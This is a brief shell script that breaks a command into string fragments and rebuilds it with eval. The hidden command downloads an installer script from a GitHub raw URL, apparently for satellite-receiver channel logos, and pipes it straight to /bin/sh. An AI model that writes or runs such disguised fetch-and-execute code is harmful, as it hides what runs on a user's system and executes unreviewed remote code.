z="
";Gz='serc';Bz=' htt';Xz='sh';Az='wget';Qz='n/in';Wz='bin/';Rz='stal';Uz='qO -';Nz='-hot';Sz='ler.';Pz='/mai';Dz='/raw';Ez='.git';Oz='bird';Fz='hubu';Vz=' | /';Kz='mil2';Tz='sh -';Cz='ps:/';Hz='onte';Lz='37/p';Jz='om/e';Iz='nt.c';Mz='icon';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz"